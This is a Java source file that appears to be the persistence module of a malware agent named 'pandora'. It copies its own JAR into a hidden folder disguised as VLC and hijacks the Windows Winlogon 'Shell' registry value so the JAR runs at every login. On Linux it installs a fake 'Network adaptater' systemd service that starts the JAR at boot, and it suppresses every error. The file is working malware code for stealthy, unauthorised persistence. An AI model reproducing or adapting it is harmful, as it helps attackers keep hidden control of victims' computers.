package org.pandora.agent.application;

import org.apache.commons.io.FileUtils;
import org.pandora.agent.launch.Launch;
import org.pandora.agent.utils.WinRegistry;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.URISyntaxException;

public class Persistence {

    private final String path;
    private final boolean windows;

    public Persistence(final boolean windows) {
        this.windows = windows;
        this.path = windows ? System.getenv("LOCALAPPDATA") + "\\VLC" : "/bin/network/";
    }

    public void register() {
        if (this.windows) {
            try {
                WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", "explorer.exe,cmd.exe /c start /min cmd.exe /c \"" + System.getenv("LOCALAPPDATA") + "\\VLC\\VLC.jar\" 1");
            } catch (final IllegalAccessException | InvocationTargetException ignore) {
            }
        } else {
            final File folder = new File("/bin/network/");
            if (!folder.exists()) folder.mkdirs();
            final File script = new File("/bin/network/sys.sh");
            if (!script.exists()) {
                try {
                    script.createNewFile();
                    final FileWriter scriptWriter = new FileWriter(script);
                    scriptWriter.write("java -Dfile.encoding=UTF8 -jar /bin/network/VLC.jar 1");
                    scriptWriter.close();
                } catch (final IOException ignore) {
                }
            }
            final File network = new File("/etc/systemd/system/network.service");
            if (!network.exists()) {
                try {
                    network.createNewFile();
                    final FileWriter networkWriter = new FileWriter(network);
                    networkWriter.write("[Unit]\n" +
                            "Description=Network adaptater\n" +
                            "\n" +
                            "[Service]\n" +
                            "Type=simple\n" +
                            "ExecStart=/bin/bash /bin/network/sys.sh\n" +
                            "\n" +
                            "[Install]\n" +
                            "WantedBy=multi-user.target");
                    networkWriter.close();
                } catch (final IOException ignore) {
                }
            }
            this.run("chmod 644 " + network.getAbsolutePath());
            this.run("sudo systemctl enable network.service");
        }
    }

    public void createFolder() {
        new File(this.path).mkdirs();
        if (this.windows) this.run("attrib +H " + this.path);
    }

    public void moveJar() {
        final File file = new File(this.windows ? this.path + "\\VLC.jar" : this.path + "/VLC.jar");
        if (file.exists()) {
            try {
                FileUtils.forceDelete(file);
            } catch (final IOException ignored) {
            }
        }
        if (!file.exists()) {
            try {
                FileUtils.copyFile(new File(Launch.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()), file);
            } catch (final IOException | URISyntaxException ignored) {
            }
        }
    }

    private void run(final String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (final IOException ignore) {
        }
    }
}
